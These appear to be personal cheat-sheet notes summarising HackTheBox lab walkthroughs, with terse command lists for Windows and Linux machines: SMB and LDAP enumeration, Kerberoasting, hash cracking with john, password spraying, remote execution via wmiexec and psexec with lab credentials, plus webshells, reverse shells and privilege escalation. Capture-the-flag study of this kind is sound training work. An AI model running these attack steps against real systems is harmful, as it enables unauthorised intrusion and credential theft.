# Win-Conceal
https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
```
nmap -sU
snmpwalk
john
ipsec up conceal
ftp
webshell .asp
reverse shell - PowerShell
JuicyPotato
```

# Win-Active
https://0xdf.gitlab.io/2018/12/08/htb-active.html
```
enum4linux 10.10.10.100
smbclient \\\\10.10.10.100\\Replication
gpp-decrypt
ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .
john hashadmin -w=/usr/share/wordlists/rockyou.txt
./wmiexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
./psexec.py Administrator:Ticketmaster1968@10.10.10.100
```



# Win-Search
https://0xdf.gitlab.io/2022/04/30/htb-search.html
```
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/hope.sharp
ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
./GetUserSPNs.py search.htb/hope.sharp -dc-ip 10.10.11.129 -request
john hash-web_svc -w=/usr/share/wordlists/rockyou.txt
crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
sheetProtection
pfx2john staff.pfx > pfx_hash
./SharpHound.exe
./smbserver.py share . -smb2support -username df -password df
./BloodHound
./wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
```



# Win-StreamIO
```
SQL Injection
ffuf with authentication
evil-winrm
winPEAS
BloodHound
PowerView.ps1
```


# Lin-Bashed
https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.68/FUZZ -fc 403 -e .aspx,.php,.txt,.html
/dev/phpbash.php
reverse shell - python
python3 -c "import pty;pty.spawn('/bin/bash')"
sudo -l
sudo -u scriptmanager bash -i
python -c shell.py
```

# Lin-SolidState
https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
```
nc 10.10.10.51 4555
telnet 10.10.10.51 110
Escape rbash
LinEnum.sh
reverse shell - nc
move to bash
```

# Lin-Jarvis
https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
```
SQL injection
Webshell
sudo -l
Reverse Shell - Bash
LinEnum.sh
PrivEsc - systemctl
```

# Lin-Backdoor
https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html
```
nmap -p- 10.10.11.125
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://backdoor.htb/wp-content/FUZZ -e .aspx,.php,.txt,.html
WP Plugins-EbookDL Dir Trav
gdbserver RCE
```
